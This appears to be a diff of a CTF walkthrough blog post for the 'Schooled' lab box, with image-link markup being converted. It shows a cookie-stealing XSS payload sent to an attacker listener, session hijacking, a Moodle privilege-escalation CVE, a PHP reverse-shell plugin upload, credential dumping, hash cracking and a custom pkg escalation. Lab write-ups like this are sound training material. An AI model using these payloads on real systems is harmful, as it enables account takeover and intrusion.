@@ -85,13 +85,13 @@ Command:
 
 Now in the above case, we are using the `-fs` command to hid entries that have a size of 20750. The reason we do this is because all of the subdomains will come back as code 200, but have that size, essntially making them bad.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-21.png" caption="Everything is 200, but has a 'bad' size'" >}}
+![](/images/2021/07/image-21.png" caption="Everything is 200, but has a 'bad' size')
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-22.png" caption="After hiding the 'bad' sizes" >}}
+![](/images/2021/07/image-22.png" caption="After hiding the 'bad' sizes)
 
 As we see above, we only have one host that shows up - `moodle`. We'll also add this to our hosts list and see what it might be hosting. When we browse to this virtual host, we see a course offering system.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-23.png" >}}
+![](/images/2021/07/image-23.png)
 
 It looks like we have the ability to create an account and login. Before we do that, we'll search to see if there are any known vulnerabilities for this platform. Turns out there are [quite a few](https://www.cvedetails.com/vulnerability-list/vendor_id-2105/product_id-3590/Moodle-Moodle.html). Many of them require some form of authentication. So we'll continue to make our account.
 
@@ -101,7 +101,7 @@ Once our account is created, we have access to the moodle interface. As we look 
 
 As we continue to look around the site, we are only able to enroll in one class - Mathematics. So we enroll and start looking through the class information and find an interesting comment in the Announcements.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-24.png" >}}
+![](/images/2021/07/image-24.png)
 
 Our instructor will be checking all of our profiles before the class begins. This is a common CTF item, we should look to find some kind of XSS in our profile page, so that when our professor views our page, it will trigger and we can scrape his cookies or some kind of other useful data.
 
@@ -109,15 +109,15 @@ Here's a good XSS Cheat Sheet to help us find one that will work - [PortSwigger]
 
 We'll head back to our profile and try to find a field that we can inject in. Luckily for us, that field is pointed out based on what we've read:
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-25.png" >}}
+![](/images/2021/07/image-25.png)
 
 So now I'll use a basic injection to see what might come up - `onerror`.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-26.png" >}}
+![](/images/2021/07/image-26.png)
 
 We'll save it in our `MoodleNet profile` location and see what happens when we save it.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/schooled_xss_test.gif" >}}
+![](/images/2021/07/schooled_xss_test.gif)
 
 Now that we know the XSS will work, let's modify this exploit a bit. We know we want the cookie data. So let's simply have the injection send that data to a server we are hosting. First we'll start up a listener on our local machine.
 
@@ -134,13 +134,13 @@ document.write('<img src="http://10.10.14.70:8080?cookie='+document.cookie+'" />
 
 Then we wait for our instructor to view our profile. In this machines case it's every two minutes.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-27.png" >}}
+![](/images/2021/07/image-27.png)
 
 Now that we have the session cookies, we can modify our current cookies with these and gain the priviledges of this user! Simply open up the Developer Tools, navigate to Storage and modify the value in the `moodle.schooled.htb` location. Refresh and we should now have Manuel's account!
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-28.png" >}}
+![](/images/2021/07/image-28.png)
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-29.png" >}}
+![](/images/2021/07/image-29.png)
 
 Now we can start looking around under this account. Nothing too new here. Some googling around turns up [CVE-2020-14321](https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-14321). Luckily for us, there's a few [PoC](https://github.com/lanzt/CVE-2020-14321) to go with it! This exploit let's us escalate from a Teacher role to a Manager role.
 
@@ -156,22 +156,22 @@ Command:
 
 Once we run our PoC, we can navigate to our enrolled users and fine Lianne Carter. We then login as this user.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-30.png" >}}
+![](/images/2021/07/image-30.png)
 
 Now we can upload our own `PHP Shell` to call back to our system. The referenced RCE.zip is in linked in the repo - https://github.com/HoangKien1020/Moodle_RCE.
 We need to modify this file with a reverse shell of your choice. I tend to use the basic Pentest Monkey shell.
 
 So we unzip the `rce.zip`. Then we modify the contents of `rce/lang/en/block_rce.php` to have the contents of our prefered shell. Now we need to upload it. We'll head over to Site Administration > Plugins.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-33.png" >}}
+![](/images/2021/07/image-33.png)
 
 Now we can 'Install plugins'. We can then upload the file from our local machine and install it.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-31.png" >}}
+![](/images/2021/07/image-31.png)
 
 We click continue once it's installed. Before we click through the pre-requisite checks, we want to be sure we have a listener open for our shell. Once we do, click continue and you should see the listener light up.
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-32.png" >}}
+![](/images/2021/07/image-32.png)
 
 It doesn't look like `Python` is installed so we can't stabalize the shell that way. Fine. We'll atleast start some internal enumeration. We transfer over `linpeas.sh` using `fetch`.
 
@@ -182,7 +182,7 @@ We then make it executable, then run it.
 
 We pretty quickly see a set of credentials:
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-34.png" >}}
+![](/images/2021/07/image-34.png)
 
 Credentials: `moodle`|`PlaybookMaster2020`, these creds are for the `mysql` instance. So now, we can try to access the databases here and see what we can find. I found that maintaining a continuous connection inside the mysql instance was causing some flakey connections, so we'll issue the commands outside of the instance.
 
@@ -190,32 +190,32 @@ Command:
 `
 /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'`
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-35.png" >}}
+![](/images/2021/07/image-35.png)
 
 Now we need to show the tables in the `moodle` database.
 
 Command:
 `/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show tables from moodle;'`
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-36.png" >}}
+![](/images/2021/07/image-36.png)
 
 There are quite a few tables, the one of interest is `mdl_user`. Let's see that.
 
 Command:
 `/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle;select * from mdl_user;'`
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-37.png" >}}
+![](/images/2021/07/image-37.png)
 
 This gives us a bunch of users as well as hashes! Let's copy these back to our machine. We see a total of 28 users. Only one of them is an admin: Jamie
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-38.png" >}}
+![](/images/2021/07/image-38.png)
 
 We'll just extract his hash, and put it into a file for cracking.
 
 Command:
 `john jamie_hash -w=/usr/share/wordlists/rockyou.txt`
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-39.png" >}}
+![](/images/2021/07/image-39.png)
 
 About a minute later, we have a password - `!QAZ2wx`. Let's try to use this password to `SSH` into the box.
 
@@ -224,11 +224,11 @@ Command:
 
 We're in!
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-40.png" >}}
+![](/images/2021/07/image-40.png)
 
 Now that we're on the box, we can start enumerating more. As usual, we run the `sudo -l` command to see if there are any dead giveaways. Sure enough, we have something:
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/image-41.png" >}}
+![](/images/2021/07/image-41.png)
 
 A quick attempt at the exploit listed on [GTFObins](https://gtfobins.github.io/gtfobins/pkg/) is a no go. Some additional searching about custom `pkgs` lead me [here](http://lastsummer.de/creating-custom-packages-on-freebsd/) and [here](https://github.com/freebsd/pkg#pkgfmt). We can almost copy paste the steps we need to follow in order to create our own package. We just need to change our command slightly so we can get a reverse shell. 
 
@@ -302,7 +302,7 @@ pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
 
 We re-run the script and the `pkg` command and get our flag!
 
-{{< figure src="__GHOST_URL__/content/images/2021/07/schooled_Root.gif" >}}
+![](/images/2021/07/schooled_Root.gif)
 
 I'll attempt to regain a reverse shell when we're closer to this box being retired. 
 
